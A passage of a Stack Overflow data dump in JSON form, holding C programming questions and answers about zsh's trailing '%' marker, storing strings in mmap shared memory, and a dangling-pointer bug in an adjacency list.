"https://i.stack.imgur.com/sBz5q.jpg?s=128&g=1", "display_name": "smac89", "link": "https://stackoverflow.com/users/2089675/smac89"}, "edited": false, "score": 1, "creation_date": 1518645433, "post_id": 48796875, "comment_id": 84596265, "body": "This is a classic facepalm moment"}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1518645478, "post_id": 48796875, "comment_id": 84596282, "body": "Cross-site duplicate: <a href=\"https://unix.stackexchange.com/questions/362772/what-is-percent-sign-prompt-in-a-shell\" title=\"what is percent sign prompt in a shell\">unix.stackexchange.com/questions/362772/&hellip;</a>"}, {"owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "edited": false, "score": 0, "creation_date": 1518645529, "post_id": 48796875, "comment_id": 84596304, "body": "@Barmar, yeah but why do i have to print a newline at the end? And do you have an idea how i can fix this, if i not want to do a \\n every time i use the printf funktion?"}, {"owner": {"reputation": 25744, "user_id": 2089675, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/sBz5q.jpg?s=128&g=1", "display_name": "smac89", "link": "https://stackoverflow.com/users/2089675/smac89"}, "edited": false, "score": 1, "creation_date": 1518645553, "post_id": 48796875, "comment_id": 84596315, "body": "@Philluminati <code>puts(&quot;Test.&quot;);</code>"}, {"owner": {"reputation": 261, "user_id": 3735221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a6e4503729f80f0760e4f22e2caad5?s=128&d=identicon&r=PG&f=1", "display_name": "Arthur Dent", "link": "https://stackoverflow.com/users/3735221/arthur-dent"}, "edited": false, "score": 1, "creation_date": 1518645583, "post_id": 48796875, "comment_id": 84596332, "body": "@Philluminati why wouldn&#39;t you want to do a \\n every time? That&#39;s pretty standard."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1518645682, "post_id": 48796875, "comment_id": 84596366, "body": "If no proof is coming, VTCing as non-reproducible."}, {"owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "reply_to_user": {"reputation": 261, "user_id": 3735221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a6e4503729f80f0760e4f22e2caad5?s=128&d=identicon&r=PG&f=1", "display_name": "Arthur Dent", "link": "https://stackoverflow.com/users/3735221/arthur-dent"}, "edited": false, "score": 0, "creation_date": 1518645842, "post_id": 48796875, "comment_id": 84596450, "body": "@ArthurDent oh okay, i didn&#39;t know that this is more or less standard. Since now i was coding with a visual studio on a windows machine. And there were no such results when i left the \\n out."}, {"owner": {"reputation": 261, "user_id": 3735221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a6e4503729f80f0760e4f22e2caad5?s=128&d=identicon&r=PG&f=1", "display_name": "Arthur Dent", "link": "https://stackoverflow.com/users/3735221/arthur-dent"}, "edited": false, "score": 0, "creation_date": 1518645951, "post_id": 48796875, "comment_id": 84596497, "body": "@Philluminati To be clear, it&#39;s standard when you want your output to be on its own line."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 3, "creation_date": 1518645981, "post_id": 48796875, "comment_id": 84596508, "body": "@Philluminati <a href=\"https://stackoverflow.com/questions/48796875/programm-is-printing-the-charater-after-performing-a-printf-command#comment84596233_48796875\">no thats not my shell prompt.</a> --&gt; What character(s) is your shell prompt?"}, {"owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "edited": false, "score": 1, "creation_date": 1518646118, "post_id": 48796875, "comment_id": 84596559, "body": "i am using zsh, so a &quot;\u279c&quot; and then the folder"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518646223, "post_id": 48796875, "comment_id": 84596592, "body": "I suspect the <code>%</code> may be a indication (from the shell) that the last output of the program did not in with a <code>&#39;\\n&#39;</code>."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1518646227, "post_id": 48796875, "comment_id": 84596594, "body": "Then I don&#39;t understand why did you accept the answer below."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 3, "creation_date": 1518646304, "post_id": 48796875, "comment_id": 84596627, "body": "Here is the answer: <a href=\"https://unix.stackexchange.com/questions/167582/why-zsh-ends-a-line-with-a-highlighted-percent-symbol\" title=\"why zsh ends a line with a highlighted percent symbol\">unix.stackexchange.com/questions/167582/&hellip;</a> Just curious what you get if running it under root."}, {"owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "edited": false, "score": 0, "creation_date": 1518646319, "post_id": 48796875, "comment_id": 84596629, "body": "yeah i mean, it solved my problem but i still don&#39;t know where the % is comming from"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518646466, "post_id": 48796875, "comment_id": 84596688, "body": "@EugeneSh. Good find.  I was <a href=\"https://stackoverflow.com/questions/48796875/programm-is-printing-the-charater-after-performing-a-printf-command#comment84596592_48796875\">close</a>."}, {"owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "edited": false, "score": 0, "creation_date": 1518646496, "post_id": 48796875, "comment_id": 84596700, "body": "thank you for that link, that explains it pretty much. But i think i am not able to accept a comment as an answer, or is that possible somehow?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518646530, "post_id": 48796875, "comment_id": 84596720, "body": "You can write an answer yourself, if you wish and accept it. But since there is already a comprehensive answer on SE anyway, I don&#39;t think it is a good idea."}, {"owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518646581, "post_id": 48796875, "comment_id": 84596741, "body": "@EugeneSh. If I execute the prgramm as root, the output is without %"}, {"owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518646613, "post_id": 48796875, "comment_id": 84596753, "body": "@EugeneSh. Okay anyway, thank you for that answer!"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1518648409, "post_id": 48796875, "comment_id": 84597536, "body": "@Philluminati Root probably doesn&#39;t use <code>zsh</code> as its shell."}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1518653412, "post_id": 48796875, "comment_id": 84599098, "body": "Please show your code and screen capture of the output since you claim it is not a shell prompt. Since Stack Overflow hides the Close reason from you: <i>Questions seeking debugging help (&quot;why isn&#39;t this code working?&quot;) must include the desired behavior, a specific problem or error and the shortest code necessary to reproduce it in the question itself. Questions without a clear problem statement are not useful to other readers. See: <a href=\"http://stackoverflow.com/help/mcve\">How to create a Minimal, Complete, and Verifiable example</a>.</i>"}], "answers": [{"comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1518645447, "post_id": 48796916, "comment_id": 84596272, "body": "He said it&#39;s not his shell prompt."}, {"owner": {"reputation": 10901, "user_id": 578749, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/40231a11da5f1c627fd21d6700edddff?s=128&d=identicon&r=PG", "display_name": "lvella", "link": "https://stackoverflow.com/users/578749/lvella"}, "edited": false, "score": 1, "creation_date": 1518645578, "post_id": 48796916, "comment_id": 84596330, "body": "Werther or not his shell prompt, the problem seems completely outside of OP&#39;s program."}, {"owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "edited": false, "score": 0, "creation_date": 1518645648, "post_id": 48796916, "comment_id": 84596356, "body": "so i have to write \\n every time i use the printf command? Or is there another opertunity to solve this?"}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "reply_to_user": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "edited": false, "score": 1, "creation_date": 1518645736, "post_id": 48796916, "comment_id": 84596398, "body": "@Philluminati: no, you only need to write <code>\\n</code> when you want the cursor put at the start of a new line. That does not mean &quot;every time&quot;. Your program cannot <i>guess</i> when you want a new line and when you don&#39;t."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "edited": false, "score": 0, "creation_date": 1518645748, "post_id": 48796916, "comment_id": 84596402, "body": "@Philluminati If you don&#39;t want whatever text you print next to be on the same line, then yes it needs to be added.  Depending on what you&#39;re printing, you might not necessarily want a newline printed."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518645774, "post_id": 48796916, "comment_id": 84596414, "body": "...or when you must have the output sent when debugging."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518645827, "post_id": 48796916, "comment_id": 84596439, "body": "@WeatherVane: I use <code>stderr</code> for that \u2013 it seems to me that automatically flushes as well."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "reply_to_user": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "edited": false, "score": 1, "creation_date": 1518678660, "post_id": 48796916, "comment_id": 84605874, "body": "@Philluminati, just follow this phrase <i>Computers don&#39;t do what you want, they only do what you say</i>  (even if it&#39;s wrong) so, if you want a new line, you have to say <i>I want it!!!</i>  From my point of view, <code>\\n</code> is not a great penalty."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 2, "last_activity_date": 1518645660, "last_edit_date": 1518645660, "creation_date": 1518645418, "answer_id": 48796916, "question_id": 48796875, "link": "https://stackoverflow.com/questions/48796875/why-the-charater-is-printed-after-performing-a-printf-without-n/48796916#48796916", "title": "Why the charater &quot;%&quot; is printed after performing a printf without &quot;\\n&quot;?", "body": "<p>Your <code>printf</code> string doesn't contain a newline character.  As a result, whatever string your shell normally prints as a prompt will appear immediately after what your program prints.</p>\n\n<p>Running on my machine:</p>\n\n<pre><code>$ ./x1\nTest.$ \n</code></pre>\n\n<p>My prompt is \"$\", so that's what appears after the string</p>\n\n<p>Adding <code>\\n</code>, which is the escape sequence for a newline, to your string will make your prompt appear on the following line:</p>\n\n<pre><code>printf(\"Test.\\n\");\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>$ ./x1\nTest.\n$ \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 10901, "user_id": 578749, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/40231a11da5f1c627fd21d6700edddff?s=128&d=identicon&r=PG", "display_name": "lvella", "link": "https://stackoverflow.com/users/578749/lvella"}, "is_accepted": false, "score": 0, "last_activity_date": 1518645509, "creation_date": 1518645509, "answer_id": 48796940, "question_id": 48796875, "link": "https://stackoverflow.com/questions/48796875/why-the-charater-is-printed-after-performing-a-printf-without-n/48796940#48796940", "title": "Why the charater &quot;%&quot; is printed after performing a printf without &quot;\\n&quot;?", "body": "<p>Try:</p>\n\n<pre><code>printf(\"Test.\\n\");\n</code></pre>\n\n<p>The word <code>Test.</code> printed by your program probably joined with the first character of your terminal prompt. Adding a <code>\\n</code> will print a new line character, so your terminal prompt will be written on the next line when your program exits.</p>\n"}], "owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1536904506, "creation_date": 1518645236, "last_edit_date": 1536904506, "question_id": 48796875, "link": "https://stackoverflow.com/questions/48796875/why-the-charater-is-printed-after-performing-a-printf-without-n", "title": "Why the charater &quot;%&quot; is printed after performing a printf without &quot;\\n&quot;?", "body": "<p>Here is my simple c code. Can anyone tell me why it gives me this output?\nI am coding on an arch linux 4.15.1-2-ARCH machine with the gcc compiler (version: 7.3.0)\nI compile with: gcc --std=c99 -Wall --pedantic client.c -o client</p>\n\n<p>I have the following code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n  printf(\"Test.\");\n  return 0;\n}\n</code></pre>\n\n<p>But it get the following Output:\n    <code>Test.%</code></p>\n\n<p>I don't know where the % is comming from. Would be great if someone can give me a hint. </p>\n"}, {"tags": ["c", "ipc", "mmap"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1518644737, "post_id": 48796648, "comment_id": 84595949, "body": "Pointers in shared memory are not usually useful, because the addresses they point to are process-specific."}], "answers": [{"comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1518644672, "post_id": 48796709, "comment_id": 84595928, "body": "What&#39;s the point of putting pointers in shared memory if they point to non-shared addresses?"}, {"owner": {"reputation": 6825, "user_id": 631429, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/a9ec13176c9cc5a876ac2bb65aac173c?s=128&d=identicon&r=PG", "display_name": "wjl", "link": "https://stackoverflow.com/users/631429/wjl"}, "edited": false, "score": 0, "creation_date": 1518644685, "post_id": 48796709, "comment_id": 84595930, "body": "Note however that the memory allocated with strdup will NOT be shared memory (which seems to be the point of the original question). To get what the original poster wants is going to require packing strings into the shared memory."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 3, "last_activity_date": 1518644943, "last_edit_date": 1518644943, "creation_date": 1518644504, "answer_id": 48796709, "question_id": 48796648, "link": "https://stackoverflow.com/questions/48796648/storing-strings-in-a-mmap-shared-array-c/48796709#48796709", "title": "storing strings in a mmap shared array? (C)", "body": "<p>When you do this:</p>\n\n<pre><code>filename = line;\nshared_array[i] = filename; \n</code></pre>\n\n<p>You're not actually copying the contents of your <code>line</code> array to <code>shared_array</code>.  You're assigning the address of <code>line</code> to each array element.  As a result, all array elements point to the same place, i.e. <code>line</code>, which will only contain the most recently stored value.</p>\n\n<p>You need to allocate memory for each string you want to copy.  You could do that with <code>strdup</code>:</p>\n\n<pre><code>shared_array[i] = strdup(line);\n</code></pre>\n\n<p>But the problem with this is that you have shared memory containing pointers to non-shared memory.</p>\n\n<p>You'll need to allocate space in shared memory for an array of strings:</p>\n\n<pre><code>const MAXLINE = 80;\nchar (*shared_array)[MAXLINE]; \nshared_array= mmap(0,100*MAXLINE,PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANON,-1,0);\n</code></pre>\n\n<p>Then you can use <code>strcpy</code> to copy into each array element:</p>\n\n<pre><code>strcpy(shared_array[i], line); \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 31, "user_id": 9210451, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-NH6Hlkxwbfo/AAAAAAAAAAI/AAAAAAAAG2w/k1aO-vmN0EQ/photo.jpg?sz=128", "display_name": "nitin pundir", "link": "https://stackoverflow.com/users/9210451/nitin-pundir"}, "is_accepted": false, "score": 0, "last_activity_date": 1553368176, "last_edit_date": 1553368176, "creation_date": 1552620145, "answer_id": 55175088, "question_id": 48796648, "link": "https://stackoverflow.com/questions/48796648/storing-strings-in-a-mmap-shared-array-c/55175088#55175088", "title": "storing strings in a mmap shared array? (C)", "body": "<p>If MAXLINE denotes total number of strings each of size N :-</p>\n\n<p>You cannot do this. It will give a very long string of size MAXLINE X N and will have to use offset to access substrings.</p>\n\n<pre><code>char (*shared_memory)[MAXLINE]  -&gt; returns pointer to a string of size MAXLINE.\nshared_array= mmap(0,100*MAXLINE,PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANON,-1,0);\n</code></pre>\n\n<p>You need to do this</p>\n\n<pre><code>char *shared_memory[MAXLINE] - This returns array of char pointers\n\nfor(int i=0; i&lt;MAXLINE;i++){\nshared_memory[i] = mmap(NULL,sizeof(char)*N,PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANONYMOUS,-1,0);\n}\n</code></pre>\n\n<p>By doing this now you can access the strings by doing shared_memory[i].\nEven though if each string is less then page granularity you will be wasting space but it will be easier to access.</p>\n\n<p>or simply use</p>\n\n<pre><code>char shared_memory[100][MAXLINE];\n</code></pre>\n"}], "owner": {"reputation": 65, "user_id": 8162642, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/5ef82cac13b6babc06cd4f1b5960458c?s=128&d=identicon&r=PG&f=1", "display_name": "iadducchio3", "link": "https://stackoverflow.com/users/8162642/iadducchio3"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1183, "favorite_count": 0, "accepted_answer_id": 48796709, "answer_count": 2, "score": 3, "last_activity_date": 1553368176, "creation_date": 1518644243, "question_id": 48796648, "link": "https://stackoverflow.com/questions/48796648/storing-strings-in-a-mmap-shared-array-c", "title": "storing strings in a mmap shared array? (C)", "body": "<p>I am trying to store all filenames in the current directory in a shared array using mmap I can print all 9 files in the directory to the screen but when I try to store them in the array (shared_array) and print the array, all entries contain the same string (file.txt). Thanks in advance!</p>\n\n<pre><code>char **shared_array; \nshared_array= mmap(0,100*sizeof(char*),PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANON,-1,0);  \nchar * filename;\n\nconst MAXLINE = 80; \nchar line [MAXLINE];\n\nFILE *fp = popen(\"/bin/ls\",\"r\");\n\nint i = 0; \nwhile(fgets(line, MAXLINE,fp) !=NULL){    \n    filename = line;\n    shared_array[i] = filename; \n    i++;        \n}\npclose(fp);\n\nint j;\nfor(j=0;j&lt;i;j++){\n    printf(\"\\n%s\",shared_array[j]);\n}\n</code></pre>\n"}, {"tags": ["c", "adjacency-list"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518643434, "post_id": 48796376, "comment_id": 84595404, "body": "Please post the <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a> that shows the problem. How can code in <code>main</code> call functions that have not been declared? And no library headers are included. Otherwise, reverse the sequence of the functions in the source code, so each has already been defined when it is called. Enable compiler warnings. Otherwise we have to ask stupid questions like &quot;did you <code>#include</code> the library header?&quot;, and so on."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1518643598, "post_id": 48796376, "comment_id": 84595472, "body": "The <code>createEdge</code> function returns an instance of the structure. That structure is passed by value to <code>addEdge</code>. The <code>newEdge</code> parameter is a local copy of the structure. That local copy ceases to exist as soon as <code>addEdge</code> returns. So <code>list[i] = &amp;newEdge</code> is not valid, it makes <code>list[i]</code> point to something that doesn&#39;t exist after <code>addEdge</code> returns."}], "answers": [{"tags": [], "owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "is_accepted": false, "score": 0, "last_activity_date": 1518646664, "creation_date": 1518646664, "answer_id": 48797157, "question_id": 48796376, "link": "https://stackoverflow.com/questions/48796376/add-node-function-changes-index-during-function-call-in-c/48797157#48797157", "title": "add node function changes index during function call in c", "body": "<p><code>list[i] = &amp;newEdge;</code></p>\n\n<p>Here <code>newEdge</code> is a function parameter, which is the same as a local variable in that it is destroyed when the function <code>addEdge</code> returns.</p>\n\n<p>So after <code>addEdge</code> returns, the list has a pointer that points to where <code>newEdge</code> used to be. Chances are the values of the edge are still there, and chances are that memory will be reused for something else the next time you call a function. In your case it happened to be reused to hold the next edge.</p>\n\n<p>The solution would be to <code>malloc</code> some space to hold the edge in the list. Memory allocated with <code>malloc</code> can't be reused until you <code>free</code> it.</p>\n"}], "owner": {"reputation": 39, "user_id": 3925890, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb8c27accffa513408ba8749248cea2?s=128&d=identicon&r=PG&f=1", "display_name": "zedzorander", "link": "https://stackoverflow.com/users/3925890/zedzorander"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 46, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1518664110, "creation_date": 1518643048, "last_edit_date": 1518664110, "question_id": 48796376, "link": "https://stackoverflow.com/questions/48796376/add-node-function-changes-index-during-function-call-in-c", "title": "add node function changes index during function call in c", "body": "<p>I am trying to create an adjacency list for an undirected, weighted graph so I can run Dijkstra's and Kruskal's algorithms on and I'm running into an interesting problem. Whenever I try to add a second edge to a list index, it seems like it changes the list index to the new edge during the function call, erasing the previous edge list index was pointing to. (I think this person was having a similar problem but there isn't an answer for it: <a href=\"https://stackoverflow.com/questions/40120088/how-to-create-an-adjacency-list-of-a-directed-graph-in-c\">How to create an adjacency list of a directed graph in C?</a>). Here is the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n// Edge node\nstruct edge{\n    int v1;                 // vertex it's coming from\n    int v2;                 // vertex it's going to\n    int weight;             // weight of edge\n    struct edge *next;\n}\n\nconst int MAX = 9;\n\nvoid createAdjList(struct edge **list);\nstruct createEdge(int v1, int v2, int weight);\nvoid addEdge(struct edge **list, struct edge newEdge);\n\nint main(){\n    struct edge *list = malloc(MAX * sizeof(struct edge));\n    createAdjList(&amp;list);\n    ...\n    return 0;\n}\n// creates the adjacency list\nvoid createAdjList(struct edge **list){\n    for(int i = 0; i &lt; MAX; ++i)\n        list[i] = 0;\n\n    // first edge from vertex 